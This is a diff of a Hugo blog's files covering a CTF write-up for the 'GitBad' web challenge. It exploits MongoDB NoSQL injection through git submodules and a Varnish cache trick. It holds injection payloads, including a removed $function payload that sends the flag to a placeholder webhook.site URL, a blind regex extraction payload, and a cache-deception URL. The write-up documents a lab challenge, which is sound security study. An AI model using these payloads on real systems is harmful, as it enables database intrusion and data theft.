@@ -1,21 +1,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>CTFs on Enigma Writeups</title>
-        <link>//localhost:1313/posts/ctf/</link>
+        <link>http://localhost:1313/posts/ctf/</link>
         <description>Recent content in CTFs on Enigma Writeups</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>      Made with 🧠 and ☕ by Enigma | &lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;
     </copyright>
         <lastBuildDate>Mon, 14 Jul 2025 00:00:00 +0000</lastBuildDate>
-        <atom:link href="//localhost:1313/posts/ctf/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="http://localhost:1313/posts/ctf/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
             <title>GitBad | Web – L3ak CTF</title>
-            <link>//localhost:1313/posts/ctf/gitbad-l3ak/</link>
+            <link>http://localhost:1313/posts/ctf/gitbad-l3ak/</link>
             <pubDate>Mon, 14 Jul 2025 00:00:00 +0000</pubDate>
             
-            <guid>//localhost:1313/posts/ctf/gitbad-l3ak/</guid>
+            <guid>http://localhost:1313/posts/ctf/gitbad-l3ak/</guid>
             <description>&lt;img src=&#34;../../../images/ctf/gitbad/image.png&#34; alt=&#34;logo&#34; style=&#34;display: block; margin: 0 auto;&#34; /&gt;
 &lt;p&gt;&lt;strong&gt;GitBad&lt;/strong&gt; was one of those challenges that felt a bit tricky at first, but ended up being a lot of fun to dig into. We were given the source code of a web application and a running instance to interact with. The app allowed users to register and upload a ZIP file that contained a .git folder—essentially simulating a Git project upload.&lt;/p&gt;
 &lt;p&gt;Sign up Page:&lt;/p&gt;</description>
@@ -137,36 +137,31 @@ new:
 <p>I crafted a payload using the MongoDB $function operator to try sending the flag value to an external webhook:</p>
 <pre tabindex="0"><code>{
   &#34;$facet&#34;: {
-    &#34;config&#34;: [
-      { &#34;$match&#34;: { &#34;username&#34;: &#34;flag&#34; } },
-      {
-        &#34;$lookup&#34;: {
-          &#34;from&#34;: &#34;config&#34;,
-          &#34;localField&#34;: &#34;username&#34;,
-          &#34;foreignField&#34;: &#34;type&#34;,
-          &#34;as&#34;: &#34;conf_docs&#34;
-        }
-      },
-      { &#34;$unwind&#34;: &#34;$conf_docs&#34; },
-      {
-        &#34;$project&#34;: {
-          &#34;_id&#34;: 0,
-          &#34;flag_value&#34;: &#34;$conf_docs.value&#34;
-        }
-      },
-      {
-        &#34;$addFields&#34;: {
-          &#34;leak&#34;: {
-            &#34;$function&#34;: {
-              &#34;body&#34;: &#34;function(value) { require(&#39;http&#39;).get(&#39;https://webhook.site/your-webhook-url/?flag=&#39; + value); return true; }&#34;,
-              &#34;args&#34;: [&#34;$flag_value&#34;],
-              &#34;lang&#34;: &#34;js&#34;
-            }
-          }
-        }
-      }
-    ]
-  }
+      &#34;config&#34;: [
+          {&#34;$match&#34;: {&#34;username&#34;: &#34;flag&#34;}},
+          {&#34;$lookup&#34;: {
+              &#34;from&#34;: &#34;config&#34;,
+              &#34;localField&#34;: &#34;username&#34;,
+              &#34;foreignField&#34;: &#34;type&#34;,
+                    &#34;as&#34;: &#34;conf_docs&#34;
+          }},
+          {&#34;$unwind&#34;: &#34;$conf_docs&#34;},
+          {&#34;$match&#34;: {
+              &#34;conf_docs.value&#34;: {&#34;$regex&#34;: f&#34;^L3AK{escaped_prefix}&#34;}
+          }},
+          {&#34;$addFields&#34;: {
+              &#34;trigger_error&#34;: {
+                  &#34;$function&#34;: {
+                      &#34;body&#34;: &#34;function(value) { if(value) { throw new Error(); } return null; }&#34;,
+                      &#34;args&#34;: [&#34;$conf_docs.value&#34;],
+                      &#34;lang&#34;: &#34;js&#34;
+                  }
+              }
+          }},
+          {&#34;$project&#34;: {&#34;_id&#34;: 0, &#34;flag_value&#34;: &#34;$conf_docs.value&#34;}},
+          {&#34;$limit&#34;: 1}
+        ]
+    }
 }
 </code></pre><p>Since MongoDB has disabled JavaScript execution for security, the server returns a 500 error if the function is parsed correctly. By running this in a script that checks for the 500 status in the /api/upload response, I can infer flag characters one by one based on regex tests.</p>
 <ol start="2">
@@ -175,6 +170,7 @@ new:
 <p>Alternatively, by tricking Varnish&rsquo;s caching behavior by appending .js and # at the end of the request URL:</p>
 <pre tabindex="0"><code>http://localhost/api/search?debug=true&amp;filter={&#34;$facet&#34;: {&#34;config&#34;: [{&#34;$match&#34;: { &#34;username&#34;: &#34;flag&#34; }},{&#34;$lookup&#34;: {&#34;from&#34;: &#34;config&#34;,&#34;localField&#34;: &#34;username&#34;,&#34;foreignField&#34;: &#34;type&#34;,&#34;as&#34;: &#34;conf_docs&#34;}},{&#34;$unwind&#34;: &#34;$conf_docs&#34;},{&#34;$project&#34;: {&#34;_id&#34;: 0,&#34;flag_value&#34;: &#34;$conf_docs.value&#34;}}]}}&amp;.js#
 </code></pre><p>Adding &amp;.js# tricks Varnish into caching the request and ignores everything after the #. This allows the server to process and cache the full NoSQL payload, enabling us to retrieve the flag from the same request without the complexity of character-by-character extraction.</p>
+<p>Then i used this URL in the gitsubmodules and uploaded the zip file.</p>
 <p><img src="../../../images/ctf/gitbad/flag.png" alt="alt text"></p>
 <h2 id="summary">Summary</h2>
 <ul>
